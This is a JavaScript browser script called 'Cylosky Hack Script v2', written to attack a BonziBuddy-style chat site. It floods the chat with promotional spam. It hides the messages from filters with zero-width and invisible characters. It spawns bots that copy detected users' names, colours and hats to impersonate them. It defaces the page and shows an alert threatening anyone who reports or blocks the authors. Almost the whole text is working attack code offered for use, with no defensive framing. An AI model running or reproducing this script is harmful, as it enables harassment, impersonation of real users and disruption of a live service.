// Cylosky Hack Script v2 - Enhanced with Bot Control, Crash Handling & Advanced Bypass
(() => {
  // Import BonziData structure from bonzi.gay
  const BonziData = {
    colors: ["black", "blue", "brown", "cyan", "green", "pink", "purple", "red", "white", "yellow", "blessed", "noob", "glow", "pope"],
    hats: ["bear", "bfdi", "bieber", "bowtie", "bucket", "chain", "cigar", "dank", "elon", "evil", "horse", "illuminati", "kamala", "king", "maga", "obama", "pot", "propeller", "tophat", "troll", "truck", "witch", "wizard"]
  };
  
  // Configuration
  const config = {
    controlBots: 5, // Number of control bots to spawn
    messageInterval: 100,
    crashHandling: true,
    advancedBypass: true,
    userImpersonation: true,
    autoReconnect: true
  };
  
  // Advanced bypass characters
  const ZERO_WIDTH_CHARS = ['\u200B', '\u200C', '\u200D', '\uFEFF'];
  const INVISIBLE_CHARS = ['\u2800', '\u180E', '\u2063'];
  const MIXED_CHARS = ['\u00A0', '\u2009', '\u200A'];
  
  // State tracking
  let detectedUsers = new Set();
  let userGUIDs = new Map();
  let bypassCounter = 0;
  let colorChangeCount = 0;
  let controlBots = [];
  let isActive = true;
  let currentRoom = "default"; // Track the current room
  
  // Random selection helpers
  function randomColor() {
    return BonziData.colors[Math.floor(Math.random() * BonziData.colors.length)];
  }
  
  function randomHat() {
    return BonziData.hats[Math.floor(Math.random() * BonziData.hats.length)];
  }
  
  // Advanced bypass string generator
  function getAdvancedBypass(count) {
    const method = count % 4;
    const random = Math.floor(Math.random() * 721);
    
    switch(method) {
      case 0:
        return ZERO_WIDTH_CHARS[count % ZERO_WIDTH_CHARS.length].repeat((count % 3) + 1) + random;
      case 1:
        return INVISIBLE_CHARS[count % INVISIBLE_CHARS.length].repeat((count % 2) + 1) + random;
      case 2:
        return MIXED_CHARS[count % MIXED_CHARS.length] + random;
      case 3:
      default:
        return '-'.repeat(count % 8) + random;
    }
  }
  
  // Crash handling wrapper
  function safeEmit(socket, event, data) {
    if (!config.crashHandling) {
      socket.emit(event, data);
      return;
    }
    
    try {
      if (socket && socket.connected) {
        socket.emit(event, data);
      }
    } catch (error) {
      console.error(`[CRASH PREVENTED] Error emitting ${event}:`, error.message);
    }
  }
  
  // Create control bot for user impersonation
  function createControlBot(userId, userName, userColor, userHat, roomName) {
    try {
      if (typeof io === "undefined") {
        console.error("Socket.io not available for control bots");
        return null;
      }
      
      const botSocket = io("https://bonzi.gay/", {
        forceNew: true,
        reconnection: config.autoReconnect,
        reconnectionDelay: 1000 + Math.random() * 2000,
        reconnectionAttempts: 10,
        timeout: 20000,
        transports: ['websocket', 'polling']
      });
      
      botSocket.on('connect', () => {
        console.log(`✓ Control bot impersonating: ${userName} in room: ${roomName}`);
        
        safeEmit(botSocket, "client", "MAIN");
        safeEmit(botSocket, "login", {
          passcode: "",
          name: userName,
          room: roomName || currentRoom
        });
        
        safeEmit(botSocket, "command", { list: ["color", userColor || randomColor()] });
        safeEmit(botSocket, "command", { list: ["hat", userHat || randomHat()] });
        
        // Control bot behavior - mimic and spam
        let botBypassCount = 0;
        const botInterval = setInterval(() => {
          if (!isActive || !botSocket.connected) {
            clearInterval(botInterval);
            return;
          }
          
          const bypass = getAdvancedBypass(botBypassCount);
          const controlMessages = [
            `HACKED BY CYLOSKY! SUB TO LOSKYTHECOPYDOG77 AND CYANPIXAR ${bypass}`,
            `I AM CONTROLLED! CYLOSKY VIRUS ACTIVE ${bypass}`,
            `CYAN PIXAR LOSKY TOOK CONTROL ${bypass}`,
            `THIS IS NOT ME! HACKED! ${bypass}`
          ];
          
          safeEmit(botSocket, 'talk', {
            text: controlMessages[botBypassCount % controlMessages.length]
          });
          
          botBypassCount++;
          
          // Random appearance changes
          if (botBypassCount % 10 === 0) {
            safeEmit(botSocket, "command", { list: ["color", randomColor()] });
            safeEmit(botSocket, "command", { list: ["hat", randomHat()] });
          }
        }, 500 + Math.random() * 500);
      });
      
      botSocket.on('error', (error) => {
        console.error(`Control bot error:`, error);
      });
      
      botSocket.on('disconnect', (reason) => {
        console.log(`Control bot disconnected: ${reason}`);
        if (config.autoReconnect && isActive) {
          setTimeout(() => botSocket.connect(), 2000 + Math.random() * 2000);
        }
      });
      
      return botSocket;
    } catch (error) {
      console.error(`Failed to create control bot:`, error);
      return null;
    }
  }
  
  // Initialize main hack
  try {
    // Trigger the YouTube video
    safeEmit(socket, 'command', {
      list: ['youtube', '8VWjG8PwPLw']
    });
    
    alert('congratulations, you got hacked, now your punishment is to SUB TO LOSKYTHECOPYDOG77 AND CYANPIXAR NOOOOOOW! if you dont, or block losky and Cyanpixar, or report both, you will get hacked again!'); 
    
    // Listen for room updates to detect and control users
    socket.on('room', (data) => {
      try {
        if (data) {
          // Update current room name if available
          if (data.room) {
            currentRoom = data.room;
            console.log(`📍 Current room: ${currentRoom}`);
          }
          
          if (data.users) {
            Object.keys(data.users).forEach(userId => {
              const user = data.users[userId];
              if (user && user.name && user.name !== 'HACKED BY CYLOSKY VIRUS') {
                detectedUsers.add(user.name);
                userGUIDs.set(userId, {
                  name: user.name,
                  color: user.color,
                  hat: user.hat
                });
                console.log('🎯 Detected user:', user.name);
                
                // Create control bot for this user if enabled and not already controlling
                if (config.userImpersonation && controlBots.length < config.controlBots) {
                  const controlBot = createControlBot(userId, user.name, user.color, user.hat, currentRoom);
                  if (controlBot) {
                    controlBots.push(controlBot);
                  }
                }
              }
            });
          }
        }
      } catch (error) {
        console.error('[CRASH PREVENTED] Room handler error:', error);
      }
    });
    
    // Main flooding interval with crash protection
    const mainInterval = setInterval(function() {
      try {
        if (!isActive) {
          clearInterval(mainInterval);
          return;
        }
        
        // Visual takeover
        try {
          document.title = 'SUB TO LOSKYTHECOPYDOG77 AND CYANPIXAR NOW!!';
          const contentEl = document.getElementById('content');
          if (contentEl) {
            contentEl.style.backgroundImage = 'url(https://cdn.discordapp.com/attachments/488233448700379156/648277281348780033/download_3.jpeg)';
            contentEl.style.backgroundRepeat = 'repeat';
          }
        } catch (error) {
          console.error('[CRASH PREVENTED] DOM manipulation error:', error);
        }
        
        // Main user takeover
        safeEmit(socket, 'command', {list: ['name', 'HACKED BY CYLOSKY VIRUS']});
        
        // Rapidly cycle through colors and hats for maximum chaos
        colorChangeCount++;
        if (colorChangeCount % 2 === 0) {
          safeEmit(socket, 'command', {list: ['color', randomColor()]});
          safeEmit(socket, 'command', {list: ['hat', randomHat()]});
        }
        
        // Generate advanced bypass
        const bypass = config.advancedBypass 
          ? getAdvancedBypass(bypassCounter) 
          : '-'.repeat(bypassCounter % 10);
        
        let floodMessage = 'CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYAN PIXAR LOSKY CYANPIXAR LOSKY ' + bypass;
        
        // Tag all detected users
        if (detectedUsers.size > 0) {
          const userList = Array.from(detectedUsers).join(' @');
          floodMessage = `@${userList} ` + floodMessage;
        }
        
        safeEmit(socket, 'talk', {text: floodMessage});
        bypassCounter++;
        
        // Occasionally trigger commands for extra chaos
        if (bypassCounter % 20 === 0) {
          const chaoticCommands = [
            ['asshole'],
            ['fact'],
            ['joke'],
            ['insult']
          ];
          const randomCmd = chaoticCommands[Math.floor(Math.random() * chaoticCommands.length)];
          safeEmit(socket, 'command', {list: randomCmd});
        }
        
      } catch (error) {
        console.error('[CRASH PREVENTED] Main loop error:', error);
      }
    }, config.messageInterval);
    
    // Cleanup handler
    window.addEventListener('beforeunload', () => {
      isActive = false;
      controlBots.forEach(bot => {
        try {
          if (bot && bot.connected) {
            bot.disconnect();
          }
        } catch (error) {
          console.error('Cleanup error:', error);
        }
      });
    });
    
    console.log("%c🔥 CYLOSKY HACK v2 ACTIVATED 🔥", "color: #ff0000; font-weight: bold; font-size: 18px;");
    console.log("%c✓ BonziData integration: ENABLED", "color: #00ff00; font-size: 14px;");
    console.log("%c✓ Advanced bypass (4 methods): ENABLED", "color: #00ff00; font-size: 14px;");
    console.log("%c✓ User detection: ENABLED", "color: #00ff00; font-size: 14px;");
    console.log("%c✓ Bot control system: ENABLED", "color: #00ff00; font-size: 14px;");
    console.log(`%c✓ Control bots: ${config.controlBots} bots will impersonate users`, "color: #00ff00; font-size: 14px;");
    console.log("%c✓ Crash handling: ENABLED", "color: #00ff00; font-size: 14px;");
    console.log("%c✓ Auto-reconnect: ENABLED", "color: #00ff00; font-size: 14px;");
    console.log("%c✓ Color/Hat randomization: ENABLED", "color: #00ff00; font-size: 14px;");
    console.log("%c✓ Chaotic commands: ENABLED", "color: #00ff00; font-size: 14px;");
    console.log("%cReady to flood with MAXIMUM CHAOS! 🎭", "color: #ff9900; font-weight: bold; font-size: 14px;");
    console.log(`%cControl bots will spawn to impersonate detected users!`, "color: #ff0000; font-weight: bold; font-size: 14px;");
    
  } catch (error) {
    console.error('[CRITICAL ERROR] Failed to initialize Cylosky Hack v2:', error);
    alert('Hack initialization failed. Check console for details.');
  }
  
  // Expose stop function for emergency shutdown
  window.stopCyloskyHack = () => {
    isActive = false;
    console.log('%cCYLOSKY HACK v2 STOPPED', 'color: #ff0000; font-weight: bold;');
  };
  
})();
